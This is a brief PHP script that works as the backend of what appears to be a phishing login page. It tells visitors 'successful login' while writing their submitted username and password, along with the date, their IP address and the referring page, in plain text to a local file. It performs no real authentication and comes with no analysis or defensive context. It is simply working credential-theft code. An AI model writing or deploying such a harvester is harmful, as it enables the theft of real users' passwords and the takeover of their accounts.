<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
}
else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $ip_address = $_SERVER['REMOTE_ADDR'];
}
echo "successful login";
file_put_contents('user.txt',  sprintf('username = %s, password = %s, date = %s, ip_address = %s, referer_name = %s', $_POST['username'],$_POST['password'],date('Y-m-d', time()),$ip_address, isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''), FILE_APPEND | LOCK_EX);
//printf("username = %s\n, password = %s\n, date = %s\n, ip_address = %s\n", $_POST['username'],$_POST['password'],date('Y-m-d', time()),$ip_address)
?>
